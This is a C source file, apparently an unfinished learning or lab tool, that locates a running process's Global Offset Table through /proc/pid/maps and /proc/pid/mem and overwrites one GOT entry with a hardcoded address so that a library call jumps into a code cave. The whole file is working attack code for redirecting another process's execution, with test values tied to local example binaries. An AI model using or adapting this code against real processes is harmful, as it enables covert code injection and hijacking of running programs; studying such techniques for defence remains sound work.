#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <elf.h>

#define COUNT 20
#define GOTMAX 20
#define ELFLEN 18000 // TODO: Make this a more sane value after testing

typedef struct got_entry {
  Elf64_Addr* addr;
  Elf64_Addr* val;
} got_entry;

typedef struct got_table {
  got_entry** entries;
  int size;
  int count;
} got_table;

void overwrite_got_entry(got_table* table, int overwrite, int* fd_mem) {
  // Only support little endian for now
  //char* write_val = "\xef\xbe\xad\xde\xbe\xba\xfe\xca"; // TODO: Change this obvs, when we are ready
  char* write_val = "\x69\x62\xcc\xba\x0d\x56\x00\x00"; // This value is a test specifically for my ASLR-enabled run of example_2. Will not be transferable
  printf("Attempting to overwrite %p -> %p\n",
      (void*)*table->entries[overwrite]->addr,
      (void*)*table->entries[overwrite]->val); 

  lseek(*fd_mem, *table->entries[overwrite]->addr, SEEK_SET);

  int write_result = write(*fd_mem, write_val, 0x8);
  if (write_result != strlen(write_val)) {
    printf("Something went wrong...\n");
    printf("You very likely broke the binary...\n");
    printf("Grab your bug out bag and GTFO!\n");

    exit(1);
  }
  
  printf("\nOverwrite was successful!\n");

  return;
}

void read_got_table(got_table* table) {
  printf("GOT has %d entries:\n", table->count);
  for (int i = 0; i < table->count; i++) {
    printf("Entry %d: %p -> %p\n", (i + 1), (void*)*table->entries[i]->addr, (void*)*table->entries[i]->val);
  }

  return;
}

void populate_got_table(got_table* table, Elf64_Addr* got, int* fd_mem) {
  Elf64_Addr* val = malloc(sizeof(Elf64_Addr));

  for (int i = 0; i < table->size; i++) {
    lseek(*fd_mem, *got, SEEK_SET);
    read(*fd_mem, val, sizeof(Elf64_Addr));
    if (*val == 0) {
      break;
    }

    // Add entry to our internal table
    table->entries[i] = malloc(sizeof(got_entry));

    table->entries[i]->addr = malloc(sizeof(Elf64_Addr));
    *table->entries[i]->addr = *got;

    table->entries[i]->val = malloc(sizeof(Elf64_Addr));
    *table->entries[i]->val = *val;

    table->count = i + 1;

    *got += 0x8; // Jump to the next addr in the laziest way possible
  }

  if (table->count == 0) {
    printf("Found GOT but didn't see any entries...\n");
    exit(1);
  }
}

void generate_got_table(got_table* table) {
  table->size = GOTMAX;
  table->count = 0;
  table->entries = (got_entry**)calloc(table->size, sizeof(got_entry*));
  if (table->entries == NULL) {
    printf("Failed to allocate table var in generate_got_table func...\n");
    exit(1);
  }

  printf("Populated GOT table...\n\n");

  return;
}

Elf64_Addr get_got(unsigned char* elf, unsigned long* addr) {
  // Get header
  Elf64_Ehdr* elf_header = (Elf64_Ehdr*)(elf);

  // Get program headers
  Elf64_Phdr* p_headers = (Elf64_Phdr*)(elf + elf_header->e_phoff);

  // Find dynamic segment
  Elf64_Phdr* dyn_seg = NULL;
  for (int i = 0; i < elf_header->e_phnum; i++) {
    if (p_headers[i].p_type == PT_DYNAMIC) {
      dyn_seg = &p_headers[i];
      break;
    }
  }
  if (!dyn_seg) {
    printf("Could not find dynamic segment...\n");
    exit(1);
  }

  // Get dynamic section from segment
  Elf64_Dyn* dyn_sec = (Elf64_Dyn*)(elf + dyn_seg->p_offset);

  // Search through dynamic section for GOT
  Elf64_Addr got = 0;
  for (int i = 0; dyn_sec[i].d_tag != DT_NULL; i++) {
    if (dyn_sec[i].d_tag == DT_PLTGOT) {
      got = dyn_sec[i].d_un.d_ptr;
      break;
    }
  }
  if (!got) {
    printf("Could not find the GOT...\n");
    exit(1);
  }

  // If the GOT was find-able, we probably just got the offset... 
  // Calculate the *rel* GOT
  got = got + *addr + 24; // 24 is the size of the GOT header we dont' care about

  return got;
}

int validate_elf(unsigned char* buf) {
  if ((buf[0] != '\x7f') || (buf[1] != 'E') || (buf[2] != 'L') || (buf[3] != 'F')) {
    printf("Either this isn't an ELF or you are reading the wrong part of memory...\n");
    return 1;
  }

  printf("ELF is an ELF...\n");

  return 0;
}

Elf64_Addr parse_elf(int* pid, unsigned long* addr, int* fd_mem) {
  int memsize = 50;
  char* mem = malloc(memsize);
  sprintf(mem, "/proc/%d/mem", *pid);

  *fd_mem = open(mem, O_RDWR);
  if (*fd_mem == -1) {
    printf("Failed to open mem file\n");
    exit(1);
  }

  unsigned char* elf = malloc(ELFLEN);
  if (elf == NULL) {
    printf("Couldn't allocate %d bytes...\n", ELFLEN);
    exit(1);
  }

  lseek(*fd_mem, *addr, SEEK_SET);
  read(*fd_mem, elf, ELFLEN);
  free(mem);

  int fail = validate_elf(elf);
  if (fail) {
    printf("Failed to validate ELF...\n");
    exit(1);
  }

  return get_got(elf, addr);
}

char* get_base_addr(int* pid) {
  char* maps = malloc(50);
  sprintf(maps, "/proc/%d/maps", *pid);

  int* fd = malloc(sizeof(int));
  *fd = open(maps, O_RDONLY);
  if (*fd == -1) {
    printf("Failed to open maps file...\n");
    exit(1);
  }

  int addr_len = 12;
  char* addr = malloc(addr_len + 1);
  read(*fd, addr, addr_len);
  addr[addr_len] = '\0';
  free(maps);
  free(fd);

  return addr;
}

int main(int argc, char** argv) {
  if (argc != 3) {
    printf("Usage: %s <pid> <code cave offset>\n", argv[0]); // code cave offset for example_3 is 4745
    return 1;
  }

  int* pid = malloc(sizeof(int));
  *pid = strtol(argv[1], NULL, 10);
  if (errno == ERANGE || errno == EINVAL || *pid == 0) {
    printf("Something went wrong with the PID you entered...\n");
    return 1;
  }
  printf("PID is good...\n");

  unsigned long* cave_offset = malloc(sizeof(unsigned long));
  *cave_offset = strtoul(argv[2], NULL, 10);
  if (errno == ERANGE || errno == EINVAL || *cave_offset == 0) {
    printf("Something went wrong with the code cave offset...\n");
    return 1;
  }

  unsigned long* addr = malloc(sizeof(unsigned long));
  char* base_addr = get_base_addr(pid);

  *addr = strtoul(base_addr, NULL, 16);
  if (errno == ERANGE || errno == EINVAL || *addr == 0) {
    printf("Something went wrong converting the base addr from a string...\n");
    return 1;
  }

  unsigned long* code_cave = malloc(sizeof(unsigned long));
  *code_cave = *addr + *cave_offset;

  Elf64_Addr* got = malloc(sizeof(Elf64_Addr)); // Ptr to GOT addr (not actual GOT in ELF)
  int* fd_mem = malloc(sizeof(int)); // Descriptor to ELF
  *got = parse_elf(pid, addr, fd_mem);

  // If you have made it this far, we need the table for GOT entries
  got_table* table = (got_table*)malloc(sizeof(got_table));
  if (table == NULL) {
    printf("Could not allocate table var...\n");
    exit(1);
  }

  generate_got_table(table);
  populate_got_table(table, got, fd_mem);
  read_got_table(table);

  // TODO: For now, we overwrite the GOT table manually
  int overwrite = 6; // Entry to overwrite (manually, for now)
  overwrite_got_entry(table, overwrite, fd_mem);

  free(fd_mem);

  return 0;
}
